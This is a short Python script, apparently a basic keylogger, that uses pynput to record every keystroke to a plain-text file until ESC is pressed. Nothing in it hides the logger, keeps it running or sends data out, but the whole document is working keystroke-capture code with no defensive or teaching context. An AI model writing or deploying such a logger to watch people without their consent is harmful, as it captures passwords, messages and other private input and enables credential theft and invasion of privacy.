from pynput import keyboard
import os

# File to store the keystrokes
log_file = "keylog.txt"

def on_press(key):
    try:
        # Try to get the character of the key
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys
        with open(log_file, "a") as f:
            f.write(f"[{key.name}]")

def on_release(key):
    # Stop the listener with ESC key
    if key == keyboard.Key.esc:
        return False

def start_keylogger():
    # Set up the listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    # Check if the log file already exists and delete it to start fresh
    if os.path.exists(log_file):
        os.remove(log_file)

    print("Starting keylogger. Press ESC to stop.")
    start_keylogger()
